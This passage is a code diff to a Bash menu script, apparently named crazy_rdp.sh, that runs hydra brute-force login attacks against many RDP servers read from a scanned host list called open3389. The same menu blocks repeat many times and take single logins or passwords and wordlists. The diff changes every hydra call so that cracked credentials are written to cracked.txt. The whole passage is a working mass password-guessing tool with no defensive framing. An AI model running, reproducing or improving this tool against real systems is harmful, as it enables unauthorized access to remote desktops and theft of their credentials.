 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5916,7 +5916,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5925,7 +5925,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5969,7 +5969,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5979,7 +5979,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5989,7 +5989,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -5998,7 +5998,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6042,7 +6042,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6052,7 +6052,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6062,7 +6062,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6071,7 +6071,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6115,7 +6115,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6125,7 +6125,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6135,7 +6135,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6144,7 +6144,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6188,7 +6188,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6198,7 +6198,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6208,7 +6208,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6217,7 +6217,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6260,7 +6260,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6270,7 +6270,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6280,7 +6280,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6289,7 +6289,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6332,7 +6332,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6342,7 +6342,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6352,7 +6352,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6361,7 +6361,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6405,7 +6405,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6415,7 +6415,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6425,7 +6425,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6434,7 +6434,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6478,7 +6478,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6488,7 +6488,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6498,7 +6498,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6507,7 +6507,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6551,7 +6551,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6561,7 +6561,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6571,7 +6571,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6580,7 +6580,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6624,7 +6624,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6634,7 +6634,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6644,7 +6644,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6653,7 +6653,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6697,7 +6697,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6707,7 +6707,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6717,7 +6717,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6726,7 +6726,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6770,7 +6770,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6780,7 +6780,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6790,7 +6790,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6799,7 +6799,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6843,7 +6843,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6853,7 +6853,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6863,7 +6863,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6872,7 +6872,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6916,7 +6916,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6926,7 +6926,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6936,7 +6936,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6945,7 +6945,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6989,7 +6989,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -6999,7 +6999,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7009,7 +7009,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7018,7 +7018,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
